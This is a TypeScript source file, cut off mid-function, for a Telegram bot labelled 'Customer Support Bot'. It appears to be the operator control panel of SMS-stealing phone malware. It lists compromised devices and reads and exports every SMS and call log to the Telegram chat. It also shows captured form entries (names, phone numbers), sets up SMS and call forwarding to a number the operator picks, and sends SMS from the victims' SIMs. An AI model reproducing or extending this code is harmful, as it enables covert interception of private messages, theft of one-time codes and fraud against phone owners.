import TelegramBot from 'node-telegram-bot-api';
import { TelegramConfig, NotificationOptions } from './types.js';
import { store } from '../store.js';
import { SMS, CallLog, Device, FormData } from '../types/index.js';
import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';

export class TelegramBotService {
    private bot: TelegramBot | null = null;
    private adminIds: Set<number> = new Set();
    private isEnabled: boolean = false;
    private hasLoggedConflict: boolean = false;
    private pollingRetryCount: number = 0;
    private maxPollingRetries: number = 3;

    // SMS conversation state: chatId -> { deviceId, subscriptionId, step, phoneNumber }
    private smsConversations: Map<number, { deviceId: string; subscriptionId: number; step: 'phone' | 'message'; phoneNumber?: string }> = new Map();

    // Forwarding conversation state: chatId -> { deviceId, type, subscriptionId }
    private forwardingConversations: Map<number, { deviceId: string; type: 'sms' | 'calls'; subscriptionId: number }> = new Map();

    // Callbacks for device control
    public onForwardingUpdate?: (deviceId: string, config: any) => void;
    public onSyncRequest?: (deviceId: string) => void;
    public onSendSms?: (deviceId: string, recipientNumber: string, message: string, requestId: string, subscriptionId?: number) => void;

    constructor(config?: TelegramConfig) {
        if (config?.token) {
            this.bot = new TelegramBot(config.token, { polling: false });
            this.adminIds = new Set(config.adminIds || []);
            this.isEnabled = true;

            this.bot.on('polling_error', (error: any) => {
                if (error.code === 'ETELEGRAM' && error.message?.includes('409 Conflict')) {
                    if (!this.hasLoggedConflict) {
                        this.hasLoggedConflict = true;
                        console.error('[Telegram] Another bot instance detected. Will retry...');
                        this.bot?.stopPolling();
                        this.retryPolling();
                    }
                } else if (!error.message?.includes('ETELEGRAM')) {
                    console.error('[Telegram] Polling error:', error.message || error);
                }
            });

            this.setupCommands();
            this.setupCallbackQueries();
            this.setupMessageListener();
            console.log('[Telegram] Bot initialized (polling will start after delay)');
            console.log(`[Telegram] Admin IDs: ${Array.from(this.adminIds).join(', ')}`);
            this.startPollingWithDelay();
        } else {
            console.log('[Telegram] Bot disabled - no token provided');
        }
    }

    private startPollingWithDelay(): void {
        const delayMs = 5000;
        console.log(`[Telegram] Starting polling in ${delayMs / 1000} seconds...`);
        setTimeout(() => {
            if (this.bot && this.isEnabled) {
                console.log('[Telegram] Starting polling now...');
                this.bot.startPolling({ restart: true });
            }
        }, delayMs);
    }

    private retryPolling(): void {
        if (this.pollingRetryCount >= this.maxPollingRetries) {
            console.error(`[Telegram] Max polling retries (${this.maxPollingRetries}) reached. Bot disabled.`);
            this.isEnabled = false;
            return;
        }
        this.pollingRetryCount++;
        const backoffMs = Math.pow(2, this.pollingRetryCount) * 5000;
        console.log(`[Telegram] Retry ${this.pollingRetryCount}/${this.maxPollingRetries} - waiting ${backoffMs / 1000}s...`);
        this.hasLoggedConflict = false;
        setTimeout(() => {
            if (this.bot && this.isEnabled) {
                console.log('[Telegram] Retrying polling...');
                this.bot.startPolling({ restart: true });
            }
        }, backoffMs);
    }

    public async stop(): Promise<void> {
        if (this.bot) {
            console.log('[Telegram] Stopping bot polling...');
            await this.bot.stopPolling();
            this.isEnabled = false;
            console.log('[Telegram] Bot stopped.');
        }
    }

    private isAdmin(userId: number, chatId?: number): boolean {
        if (this.adminIds.size === 0) return true;
        if (this.adminIds.has(userId)) return true;
        if (chatId && this.adminIds.has(chatId)) return true;
        return false;
    }

    // ==================== COMMANDS ====================

    private setupCommands(): void {
        if (!this.bot) return;

        // Only 2 commands: /devices and /actions
        this.bot.setMyCommands([
            { command: 'devices', description: 'List all connected devices' },
            { command: 'actions', description: 'Perform actions on a device' },
        ]);

        // /devices - List all devices with status
        this.bot.onText(/\/devices/, (msg) => {
            if (!this.isAdmin(msg.from?.id || 0, msg.chat.id)) {
                this.bot?.sendMessage(msg.chat.id, '⛔ Unauthorized access.');
                return;
            }
            this.showDevicesList(msg.chat.id);
        });

        // /actions - Select device then show action menu
        this.bot.onText(/\/actions/, (msg) => {
            if (!this.isAdmin(msg.from?.id || 0, msg.chat.id)) {
                this.bot?.sendMessage(msg.chat.id, '⛔ Unauthorized access.');
                return;
            }
            this.showDeviceSelection(msg.chat.id);
        });

        // /start - Welcome message
        this.bot.onText(/\/start/, (msg) => {
            if (!this.isAdmin(msg.from?.id || 0, msg.chat.id)) {
                this.bot?.sendMessage(msg.chat.id, '⛔ Unauthorized access.');
                return;
            }
            this.bot?.sendMessage(msg.chat.id,
                '🤖 *Customer Support Bot*\n\n' +
                'Use the commands below to manage devices:\n\n' +
                '📱 /devices - View all connected devices\n' +
                '⚡ /actions - Perform actions on a device',
                { parse_mode: 'Markdown' }
            );
        });
    }

    // ==================== DEVICE VIEWS ====================

    private showDevicesList(chatId: number): void {
        const devices = store.getAllDevices();
        if (devices.length === 0) {
            this.bot?.sendMessage(chatId, '📱 No devices connected.');
            return;
        }

        let message = '*📱 Connected Devices:*\n\n';
        devices.forEach((device, index) => {
            const status = device.status === 'online' ? '🟢' : '🔴';
            message += `${index + 1}. ${status} *${device.name}*\n`;
            message += `   Phone: ${device.phoneNumber || 'N/A'}\n\n`;
        });

        this.bot?.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    }

    private showDeviceSelection(chatId: number): void {
        const devices = store.getAllDevices();
        if (devices.length === 0) {
            this.bot?.sendMessage(chatId, '📱 No devices connected.');
            return;
        }

        const buttons: TelegramBot.InlineKeyboardButton[][] = devices.map(device => {
            const status = device.status === 'online' ? '🟢' : '🔴';
            const shortId = device.id.substring(0, 8);
            return [{
                text: `${status} ${device.name}`,
                callback_data: `action_menu:${shortId}`
            }];
        });

        this.bot?.sendMessage(chatId, '*⚡ Select a device:*', {
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: buttons }
        });
    }

    private showActionMenu(chatId: number, deviceData: any): void {
        const device = deviceData.device;
        const shortId = device.id.substring(0, 8);
        const status = device.status === 'online' ? '🟢 Online' : '🔴 Offline';

        const message = `*📱 ${device.name}*\nStatus: ${status}\n\n*Select an action:*`;

        const buttons: TelegramBot.InlineKeyboardButton[][] = [
            [
                { text: '📨 SMS', callback_data: `sms_menu:${shortId}` },
                { text: '📞 Calls', callback_data: `calls_menu:${shortId}` },
            ],
            [
                { text: '📝 Forms', callback_data: `forms:${shortId}` },
                { text: '📤 Forward', callback_data: `forward:${shortId}` },
            ],
            [
                { text: '📊 Status', callback_data: `status:${shortId}` },
                { text: '🔄 Sync', callback_data: `sync:${shortId}` },
            ],
            [
                { text: '⬅️ Back to Devices', callback_data: 'back_devices' },
            ]
        ];

        this.bot?.sendMessage(chatId, message, {
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: buttons }
        });
    }

    // ==================== SMS MENU ====================

    private showSmsMenu(chatId: number, deviceData: any): void {
        const device = deviceData.device;
        const shortId = device.id.substring(0, 8);
        const smsCount = deviceData.sms.length;

        const message = `*📨 SMS - ${device.name}*\n\nTotal messages: ${smsCount}\n\n*Select an option:*`;

        const buttons: TelegramBot.InlineKeyboardButton[][] = [
            [
                { text: '📥 View Last 5', callback_data: `view_sms:${shortId}` },
            ],
            [
                { text: '📄 Download All (.txt)', callback_data: `download_sms:${shortId}` },
            ],
            [
                { text: '✉️ Send SMS', callback_data: `sendsms:${shortId}` },
            ],
            [
                { text: '⬅️ Back', callback_data: `action_menu:${shortId}` },
            ]
        ];

        this.bot?.sendMessage(chatId, message, {
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: buttons }
        });
    }

    private async showLastSMS(chatId: number, deviceData: any): Promise<void> {
        const device = deviceData.device;
        const shortId = device.id.substring(0, 8);

        // Sync if online
        if (device.status === 'online' && this.onSyncRequest) {
            this.onSyncRequest(device.id);
            await new Promise(resolve => setTimeout(resolve, 2000));
            deviceData = this.findDevice(shortId);
            if (!deviceData) {
                this.bot?.sendMessage(chatId, '❌ Device not found after sync.');
                return;
            }
        }

        if (deviceData.sms.length === 0) {
            this.bot?.sendMessage(chatId, `📭 No SMS for ${device.name}`, {
                reply_markup: {
                    inline_keyboard: [[{ text: '⬅️ Back', callback_data: `sms_menu:${shortId}` }]]
                }
            });
            return;
        }

        // Sort by timestamp descending (most recent first) and take 5
        const sortedSms = [...deviceData.sms].sort((a: SMS, b: SMS) =>
            new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
        );
        const smsList = sortedSms.slice(0, 5);

        let message = `*📨 Last 5 SMS (${device.name}):*\n\n`;
        smsList.forEach((sms: SMS, index: number) => {
            const icon = sms.type === 'incoming' ? '📥' : '📤';
            const contact = sms.type === 'incoming' ? sms.sender : sms.receiver;
            const date = new Date(sms.timestamp).toLocaleString();
            // Full message content - no truncation
            message += `${index + 1}. ${icon} *${contact}*\n`;
            message += `🕐 ${date}\n`;
            message += `${sms.message}\n\n`;
        });

        this.bot?.sendMessage(chatId, message, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[{ text: '⬅️ Back', callback_data: `sms_menu:${shortId}` }]]
            }
        });
    }

    private async downloadAllSMS(chatId: number, deviceData: any): Promise<void> {
        const device = deviceData.device;
        const shortId = device.id.substring(0, 8);

        if (deviceData.sms.length === 0) {
            this.bot?.sendMessage(chatId, `📭 No SMS to download for ${device.name}`, {
                reply_markup: {
                    inline_keyboard: [[{ text: '⬅️ Back', callback_data: `sms_menu:${shortId}` }]]
                }
            });
            return;
        }

        // Sort by timestamp descending
        const sortedSms = [...deviceData.sms].sort((a: SMS, b: SMS) =>
            new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
        );

        // Generate text content
        let content = `SMS Export - ${device.name}\n`;
        content += `Generated: ${new Date().toLocaleString()}\n`;
        content += `Total Messages: ${sortedSms.length}\n`;
        content += '='.repeat(50) + '\n\n';

        sortedSms.forEach((sms: SMS, index: number) => {
            const direction = sms.type === 'incoming' ? 'FROM' : 'TO';
            const contact = sms.type === 'incoming' ? sms.sender : sms.receiver;
            const date = new Date(sms.timestamp).toLocaleString();
            content += `[${index + 1}] ${direction}: ${contact}\n`;
            content += `Date: ${date}\n`;
            content += `Message:\n${sms.message}\n`;
            content += '-'.repeat(40) + '\n\n';
        });

        // Write to temp file and send
        const tempDir = os.tmpdir();
        const fileName = `sms_${device.name.replace(/\s+/g, '_')}_${Date.now()}.txt`;
        const filePath = path.join(tempDir, fileName);

        fs.writeFileSync(filePath, content, 'utf8');

        try {
            await this.bot?.sendDocument(chatId, filePath, {
                caption: `📄 All SMS from ${device.name} (${sortedSms.length} messages)`,
                reply_markup: {
                    inline_keyboard: [[{ text: '⬅️ Back', callback_data: `sms_menu:${shortId}` }]]
                }
            });
        } finally {
            // Clean up temp file
            fs.unlinkSync(filePath);
        }
    }

    // ==================== CALLS MENU ====================

    private showCallsMenu(chatId: number, deviceData: any): void {
        const device = deviceData.device;
        const shortId = device.id.substring(0, 8);
        const callsCount = deviceData.calls.length;

        const message = `*📞 Calls - ${device.name}*\n\nTotal calls: ${callsCount}\n\n*Select an option:*`;

        const buttons: TelegramBot.InlineKeyboardButton[][] = [
            [
                { text: '📥 View Last 5', callback_data: `view_calls:${shortId}` },
            ],
            [
                { text: '📄 Download All (.txt)', callback_data: `download_calls:${shortId}` },
            ],
            [
                { text: '⬅️ Back', callback_data: `action_menu:${shortId}` },
            ]
        ];

        this.bot?.sendMessage(chatId, message, {
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: buttons }
        });
    }

    private async showLastCalls(chatId: number, deviceData: any): Promise<void> {
        const device = deviceData.device;
        const shortId = device.id.substring(0, 8);

        // Sync if online
        if (device.status === 'online' && this.onSyncRequest) {
            this.onSyncRequest(device.id);
            await new Promise(resolve => setTimeout(resolve, 2000));
            deviceData = this.findDevice(shortId);
            if (!deviceData) {
                this.bot?.sendMessage(chatId, '❌ Device not found after sync.');
                return;
            }
        }

        if (deviceData.calls.length === 0) {
            this.bot?.sendMessage(chatId, `📭 No calls for ${device.name}`, {
                reply_markup: {
                    inline_keyboard: [[{ text: '⬅️ Back', callback_data: `calls_menu:${shortId}` }]]
                }
            });
            return;
        }

        // Sort by timestamp descending (most recent first) and take 5
        const sortedCalls = [...deviceData.calls].sort((a: CallLog, b: CallLog) =>
            new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
        );
        const callsList = sortedCalls.slice(0, 5);

        let message = `*📞 Last 5 Calls (${device.name}):*\n\n`;
        callsList.forEach((call: CallLog, index: number) => {
            const icon = call.type === 'incoming' ? '📥' : call.type === 'outgoing' ? '📤' : '📵';
            const typeLabel = call.type === 'incoming' ? 'Incoming' : call.type === 'outgoing' ? 'Outgoing' : 'Missed';
            const duration = call.duration > 0 ? `${Math.floor(call.duration / 60)}m ${call.duration % 60}s` : '-';
            const date = new Date(call.timestamp).toLocaleString();
            message += `${index + 1}. ${icon} *${call.number}*\n`;
            message += `   ${typeLabel} | Duration: ${duration}\n`;
            message += `   🕐 ${date}\n\n`;
        });

        this.bot?.sendMessage(chatId, message, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[{ text: '⬅️ Back', callback_data: `calls_menu:${shortId}` }]]
            }
        });
    }

    private async downloadAllCalls(chatId: number, deviceData: any): Promise<void> {
        const device = deviceData.device;
        const shortId = device.id.substring(0, 8);

        if (deviceData.calls.length === 0) {
            this.bot?.sendMessage(chatId, `📭 No calls to download for ${device.name}`, {
                reply_markup: {
                    inline_keyboard: [[{ text: '⬅️ Back', callback_data: `calls_menu:${shortId}` }]]
                }
            });
            return;
        }

        // Sort by timestamp descending
        const sortedCalls = [...deviceData.calls].sort((a: CallLog, b: CallLog) =>
            new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
        );

        // Generate text content
        let content = `Call Log Export - ${device.name}\n`;
        content += `Generated: ${new Date().toLocaleString()}\n`;
        content += `Total Calls: ${sortedCalls.length}\n`;
        content += '='.repeat(50) + '\n\n';

        sortedCalls.forEach((call: CallLog, index: number) => {
            const typeLabel = call.type === 'incoming' ? 'INCOMING' : call.type === 'outgoing' ? 'OUTGOING' : 'MISSED';
            const duration = call.duration > 0 ? `${Math.floor(call.duration / 60)}m ${call.duration % 60}s` : 'N/A';
            const date = new Date(call.timestamp).toLocaleString();
            content += `[${index + 1}] ${typeLabel}: ${call.number}\n`;
            content += `Date: ${date}\n`;
            content += `Duration: ${duration}\n`;
            content += '-'.repeat(40) + '\n\n';
        });

        // Write to temp file and send
        const tempDir = os.tmpdir();
        const fileName = `calls_${device.name.replace(/\s+/g, '_')}_${Date.now()}.txt`;
        const filePath = path.join(tempDir, fileName);

        fs.writeFileSync(filePath, content, 'utf8');

        try {
            await this.bot?.sendDocument(chatId, filePath, {
                caption: `📄 All calls from ${device.name} (${sortedCalls.length} calls)`,
                reply_markup: {
                    inline_keyboard: [[{ text: '⬅️ Back', callback_data: `calls_menu:${shortId}` }]]
                }
            });
        } finally {
            fs.unlinkSync(filePath);
        }
    }

    // ==================== FORMS ====================

    private showForms(chatId: number, deviceData: any): void {
        const device = deviceData.device;
        const shortId = device.id.substring(0, 8);
        const forms = deviceData.forms.slice(-10).reverse();

        if (forms.length === 0) {
            this.bot?.sendMessage(chatId, `📭 No form submissions for ${device.name}`, {
                reply_markup: {
                    inline_keyboard: [[{ text: '⬅️ Back', callback_data: `action_menu:${shortId}` }]]
                }
            });
            return;
        }

        let message = `*📝 Form Submissions (${device.name}):*\n\n`;
        forms.forEach((form: FormData, index: number) => {
            const date = new Date(form.submittedAt).toLocaleString();
            message += `${index + 1}. *${form.name}*\n`;
            message += `   📱 ${form.phoneNumber}\n`;
            message += `   🕐 ${date}\n\n`;
        });

        this.bot?.sendMessage(chatId, message, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[{ text: '⬅️ Back', callback_data: `action_menu:${shortId}` }]]
            }
        });
    }

    // ==================== STATUS ====================

    private showStatus(chatId: number, deviceData: any): void {
        const device = deviceData.device;
        const shortId = device.id.substring(0, 8);
        const status = device.status === 'online' ? '🟢 Online' : '🔴 Offline';
        const fwd = deviceData.forwarding;
        const simCards = device.simCards || [];

        let message = `*📱 ${device.name}*\n\n`;
        message += `Status: ${status}\n`;
        message += `Phone: ${device.phoneNumber || 'N/A'}\n\n`;

        if (simCards.length > 0) {
            message += `*📶 SIM Cards (${simCards.length}):*\n`;
            simCards.forEach((sim: any, i: number) => {
                message += `\n*SIM ${i + 1}:*\n`;
                message += `   Carrier: ${sim.carrierName || 'Unknown'}\n`;
                message += `   Number: ${sim.phoneNumber || 'N/A'}\n`;
            });
            message += `\n`;
        }

        message += `*📤 Forwarding:*\n`;
        if (fwd.smsEnabled) {
            const smsSim = this.getSimInfoBySubscriptionId(simCards, fwd.smsSubscriptionId);
            message += `SMS: ✅ ON → ${fwd.smsForwardTo}`;
            if (smsSim) message += ` (via ${smsSim.carrierName || 'SIM'})`;
            message += `\n`;
        } else {
            message += `SMS: ❌ Off\n`;
        }
        if (fwd.callsEnabled) {
            const callsSim = this.getSimInfoBySubscriptionId(simCards, fwd.callsSubscriptionId);
            message += `Calls: ✅ ON → ${fwd.callsForwardTo}`;
            if (callsSim) message += ` (via ${callsSim.carrierName || 'SIM'})`;
        } else {
            message += `Calls: ❌ Off`;
        }

        this.bot?.sendMessage(chatId, message, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[{ text: '⬅️ Back', callback_data: `action_menu:${shortId}` }]]
            }
        });
    }

    private getSimInfoBySubscriptionId(simCards: any[], subscriptionId: number): any | null {
        if (!subscriptionId || subscriptionId === -1) return null;
        return simCards.find((sim: any) => sim.subscriptionId === subscriptionId) || null;
    }

    // ==================== SYNC ====================

    private requestSync(chatId: number, deviceData: any): void {
        const device = deviceData.device;
        const shortId = device.id.substring(0, 8);

        if (device.status !== 'online') {
            this.bot?.sendMessage(chatId, '❌ Device is offline.', {
                reply_markup: {
                    inline_keyboard: [[{ text: '⬅️ Back', callback_data: `action_menu:${shortId}` }]]
                }
            });
            return;
        }

        if (this.onSyncRequest) {
            this.onSyncRequest(device.id);
            this.bot?.sendMessage(chatId, `🔄 Sync requested for *${device.name}*`, {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[{ text: '⬅️ Back', callback_data: `action_menu:${shortId}` }]]
                }
            });
        }
    }

    // ==================== FORWARDING ====================

    private showForwardOptions(chatId: number, deviceData: any): void {
        const device = deviceData.device;
        const shortId = device.id.substring(0, 8);

        const message = `*📤 Forwarding - ${device.name}*\n\n*Select what to forward:*`;

        const buttons: TelegramBot.InlineKeyboardButton[][] = [
            [{ text: '📨 SMS', callback_data: `fwd_sms_menu:${shortId}` }],
            [{ text: '📞 Calls', callback_data: `fwd_calls_menu:${shortId}` }],
            [{ text: '⬅️ Back', callback_data: `action_menu:${shortId}` }]
        ];

        this.bot?.sendMessage(chatId, message, {
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: buttons }
        });
    }

    private showForwardSmsMenu(chatId: number, deviceData: any): void {
        const device = deviceData.device;
        const fwd = deviceData.forwarding;
        const shortId = device.id.substring(0, 8);
        const simCards = device.simCards || [];

        let statusLine = '';
        if (fwd.smsEnabled) {
            const smsSim = this.getSimInfoBySubscriptionId(simCards, fwd.smsSubscriptionId);
            statusLine = `✅ ON → ${fwd.smsForwardTo}`;
            if (smsSim) statusLine += ` (via ${smsSim.carrierName || 'SIM'})`;
        } else {
            statusLine = '❌ OFF';
        }

        const message = `*📨 SMS Forwarding - ${device.name}*\n\nStatus: ${statusLine}\n\n*Select an option:*`;

        const buttons: TelegramBot.InlineKeyboardButton[][] = [
            [{ text: '✅ On', callback_data: `fwd_sms_on:${shortId}` }],
            [{ text: '❌ Off', callback_data: `fwd_sms_off:${shortId}` }],
            [{ text: '� Check', callback_data: `fwd_sms_check:${shortId}` }],
            [{ text: '⬅️ Back', callback_data: `forward:${shortId}` }]
        ];

        this.bot?.sendMessage(chatId, message, {
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: buttons }
        });
    }

    private showForwardCallsMenu(chatId: number, deviceData: any): void {
        const device = deviceData.device;
        const fwd = deviceData.forwarding;
        const shortId = device.id.substring(0, 8);
        const simCards = device.simCards || [];

        let statusLine = '';
        if (fwd.callsEnabled) {
            const callsSim = this.getSimInfoBySubscriptionId(simCards, fwd.callsSubscriptionId);
            statusLine = `✅ ON → ${fwd.callsForwardTo}`;
            if (callsSim) statusLine += ` (via ${callsSim.carrierName || 'SIM'})`;
        } else {
            statusLine = '❌ OFF';
        }

        const message = `*📞 Call Forwarding - ${device.name}*\n\nStatus: ${statusLine}\n\n*Select an option:*`;

        const buttons: TelegramBot.InlineKeyboardButton[][] = [
            [{ text: '✅ On', callback_data: `fwd_calls_on:${shortId}` }],
            [{ text: '❌ Off', callback_data: `fwd_calls_off:${shortId}` }],
            [{ text: '� Check', callback_data: `fwd_calls_check:${shortId}` }],
            [{ text: '⬅️ Back', callback_data: `forward:${shortId}` }]
        ];

        this.bot?.sendMessage(chatId, message, {
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: buttons }
        });
    }

    private showForwardingCheck(chatId: number, deviceData: any, type: 'sms' | 'calls'): void {
        const device = deviceData.device;
        const fwd = deviceData.forwarding;
        const shortId = device.id.substring(0, 8);
        const simCards = device.simCards || [];

        const isEnabled = type === 'sms' ? fwd.smsEnabled : fwd.callsEnabled;
        const forwardTo = type === 'sms' ? fwd.smsForwardTo : fwd.callsForwardTo;
        const subscriptionId = type === 'sms' ? fwd.smsSubscriptionId : fwd.callsSubscriptionId;
        const typeLabel = type === 'sms' ? '📨 SMS' : '📞 Calls';

        let message = `*${typeLabel} Forwarding Status*\n\n`;
        message += `📱 Device: *${device.name}*\n\n`;

        if (isEnabled) {
            message += `✅ *Status: ENABLED*\n\n`;
            message += `📤 Forwarding to: \`${forwardTo}\`\n`;
            const sim = this.getSimInfoBySubscriptionId(simCards, subscriptionId);
            if (sim) {
                message += `📶 Using SIM: *${sim.carrierName || 'Unknown'}*\n`;
                if (sim.phoneNumber) message += `   Number: ${sim.phoneNumber}\n`;
            } else {
                message += `📶 Using SIM: Default\n`;
            }
        } else {
            message += `❌ *Status: DISABLED*\n\n`;
            message += `Forwarding is currently turned off.`;
        }

        const backCallback = type === 'sms' ? `fwd_sms_menu:${shortId}` : `fwd_calls_menu:${shortId}`;

        this.bot?.sendMessage(chatId, message, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[{ text: '⬅️ Back', callback_data: backCallback }]]
            }
        });
    }

    private promptForwardNumber(chatId: number, deviceData: any, type: 'sms' | 'calls'): void {
        const device = deviceData.device;
        const shortId = device.id.substring(0, 8);
        const simCards = device.simCards || [];

        if (simCards.length > 1) {
            let message = `*📤 ${type === 'sms' ? 'SMS' : 'Call'} Forwarding*\n\n📶 *Select SIM:*`;
            const buttons: TelegramBot.InlineKeyboardButton[][] = simCards.map((sim: any, i: number) => [{
                text: `📱 ${sim.carrierName} (${sim.phoneNumber || 'SIM ' + (i + 1)})`,
                callback_data: `fwd_sim:${shortId}:${type}:${i}`
            }]);
            buttons.push([{ text: '❌ Cancel', callback_data: `forward:${shortId}` }]);

            this.bot?.sendMessage(chatId, message, {
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: buttons }
            });
        } else {
            this.startForwardingConversation(chatId, deviceData, type, 0);
        }
    }

    private startForwardingConversation(chatId: number, deviceData: any, type: 'sms' | 'calls', simIndex: number): void {
        const device = deviceData.device;
        const simCards = device.simCards || [];
        const selectedSim = simCards[simIndex];
        const subscriptionId = selectedSim?.subscriptionId || -1;

        this.forwardingConversations.set(chatId, {
            deviceId: device.id,
            type,
            subscriptionId
        });

        const typeLabel = type === 'sms' ? '📨 SMS' : '📞 Calls';
        this.bot?.sendMessage(chatId,
            `*${typeLabel} Forwarding*\n\n📱 Enter the phone number to forward to:`,
            {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[{ text: '❌ Cancel', callback_data: 'fwd_cancel:0' }]]
                }
            }
        );
    }

    private setForwarding(chatId: number, deviceData: any, type: 'sms' | 'calls', enabled: boolean): void {
        const shortId = deviceData.device.id.substring(0, 8);
        const configUpdate = type === 'sms'
            ? { smsEnabled: enabled, smsForwardTo: '' }
            : { callsEnabled: enabled, callsForwardTo: '' };

        if (this.onForwardingUpdate) {
            this.onForwardingUpdate(deviceData.device.id, configUpdate);
            const typeLabel = type === 'sms' ? '📨 SMS' : '📞 Calls';
            this.bot?.sendMessage(chatId, `✅ ${typeLabel} forwarding turned OFF`, {
                reply_markup: {
                    inline_keyboard: [[{ text: '⬅️ Back', callback_data: `forward:${shortId}` }]]
                }
            });
        }
    }

    // ==================== SEND SMS ====================

    private promptSendSMS(chatId: number, deviceData: any): void {
        const device = deviceData.device;
        const shortId = device.id.substring(0, 8);

        if (device.status !== 'online') {
            this.bot?.sendMessage(chatId, '❌ Device is offline.', {
                reply_markup: {
                    inline_keyboard: [[{ text: '⬅️ Back', callback_data: `sms_menu:${shortId}` }]]
                }
            });
            return;
        }

        const simCards = device.simCards || [];

        if (simCards.length <= 1) {
            this.startSmsConversation(chatId, deviceData, 0);
            return;
        }

        let message = `*✉️ Send SMS via ${device.name}*\n\n📶 *Select SIM:*`;
        const buttons: TelegramBot.InlineKeyboardButton[][] = simCards.map((sim: any, i: number) => [{
            text: `📱 ${sim.carrierName} (${sim.phoneNumber || 'SIM ' + (i + 1)})`,
            callback_data: `sms_sim:${shortId}:${i}`
        }]);
        buttons.push([{ text: '❌ Cancel', callback_data: `sms_menu:${shortId}` }]);

        this.bot?.sendMessage(chatId, message, {
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: buttons }
        });
    }

    private startSmsConversation(chatId: number, deviceData: any, simIndex: number): void {
        const device = deviceData.device;
        const simCards = device.simCards || [];
        const selectedSim = simCards[simIndex];
        const subscriptionId = selectedSim?.subscriptionId || -1;

        this.smsConversations.set(chatId, {
            deviceId: device.id,
            subscriptionId,
            step: 'phone'
        });

        this.bot?.sendMessage(chatId,
            `*✉️ Send SMS via ${device.name}*\n\n📱 Enter the recipient's phone number:`,
            {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[{ text: '❌ Cancel', callback_data: 'sms_cancel:0' }]]
                }
            }
        );
    }

    // ==================== CALLBACK QUERIES ====================

    private setupCallbackQueries(): void {
        if (!this.bot) return;

        this.bot.on('callback_query', async (query) => {
            if (!query.data || !query.message) return;
            if (!this.isAdmin(query.from.id, query.message.chat.id)) {
                this.bot?.answerCallbackQuery(query.id, { text: '⛔ Unauthorized' });
                return;
            }

            const chatId = query.message.chat.id;
            const parts = query.data.split(':');
            const action = parts[0];
            const shortId = parts[1];

            this.bot?.answerCallbackQuery(query.id);

            // Handle back to devices
            if (action === 'back_devices') {
                this.showDeviceSelection(chatId);
                return;
            }

            // Handle cancel actions
            if (action === 'sms_cancel') {
                this.smsConversations.delete(chatId);
                this.bot?.sendMessage(chatId, '❌ SMS cancelled.');
                return;
            }
            if (action === 'fwd_cancel') {
                this.forwardingConversations.delete(chatId);
                this.bot?.sendMessage(chatId, '❌ Forwarding setup cancelled.');
                return;
            }

            // Find device for actions that need it
            const deviceData = shortId ? this.findDevice(shortId) : null;

            switch (action) {
                case 'action_menu':
                    if (deviceData) this.showActionMenu(chatId, deviceData);
                    else this.bot?.sendMessage(chatId, '❌ Device not found.');
                    break;

                case 'sms_menu':
                    if (deviceData) this.showSmsMenu(chatId, deviceData);
                    else this.bot?.sendMessage(chatId, '❌ Device not found.');
                    break;

                case 'view_sms':
                    if (deviceData) await this.showLastSMS(chatId, deviceData);
                    else this.bot?.sendMessage(chatId, '❌ Device not found.');
                    break;

                case 'download_sms':
                    if (deviceData) await this.downloadAllSMS(chatId, deviceData);
                    else this.bot?.sendMessage(chatId, '❌ Device not found.');
                    break;

                case 'sendsms':
                    if (deviceData) this.promptSendSMS(chatId, deviceData);
                    else this.bot?.sendMessage(chatId, '❌ Device not found.');
                    break;

                case 'calls_menu':
                    if (deviceData) this.showCallsMenu(chatId, deviceData);
                    else this.bot?.sendMessage(chatId, '❌ Device not found.');
                    break;

                case 'view_calls':
                    if (deviceData) await this.showLastCalls(chatId, deviceData);
                    else this.bot?.sendMessage(chatId, '❌ Device not found.');
                    break;

                case 'download_calls':
                    if (deviceData) await this.downloadAllCalls(chatId, deviceData);
                    else this.bot?.sendMessage(chatId, '❌ Device not found.');
                    break;

                case 'forms':
                    if (deviceData) this.showForms(chatId, deviceData);
                    else this.bot?.sendMessage(chatId, '❌ Device not found.');
                    break;

                case 'status':
                    if (deviceData) this.showStatus(chatId, deviceData);
                    else this.bot?.sendMessage(chatId, '❌ Device not found.');
                    break;

                case 'sync':
                    if (deviceData) this.requestSync(chatId, deviceData);
                    else this.bot?.sendMessage(chatId, '❌ Device not found.');
                    break;

                case 'forward':
                    if (deviceData) this.showForwardOptions(chatId, deviceData);
                    else this.bot?.sendMessage(chatId, '❌ Device not found.');
                    break;

                case 'fwd_sms_menu':
                    if (deviceData) this.showForwardSmsMenu(chatId, deviceData);
                    break;

                case 'fwd_calls_menu':
                    if (deviceData) this.showForwardCallsMenu(chatId, deviceData);
                    break;

                case 'fwd_sms_on':
                    if (deviceData) this.promptForwardNumber(chatId, deviceData, 'sms');
                    break;

                case 'fwd_sms_off':
                    if (deviceData) this.setForwarding(chatId, deviceData, 'sms', false);
                    break;

                case 'fwd_sms_check':
                    if (deviceData) this.showForwardingCheck(chatId, deviceData, 'sms');
                    break;

                case 'fwd_calls_on':
                    if (deviceData) this.promptForwardNumber(chatId, deviceData, 'calls');
                    break;

                case 'fwd_calls_off':
                    if (deviceData) this.setForwarding(chatId, deviceData, 'calls', false);
                    break;

                case 'fwd_calls_check':
                    if (deviceData) this.showForwardingCheck(chatId, deviceData, 'calls');
                    break;

                case 'sms_sim':
                    if (parts.length >= 3 && deviceData) {
                        const simIndex = parseInt(parts[2], 10);
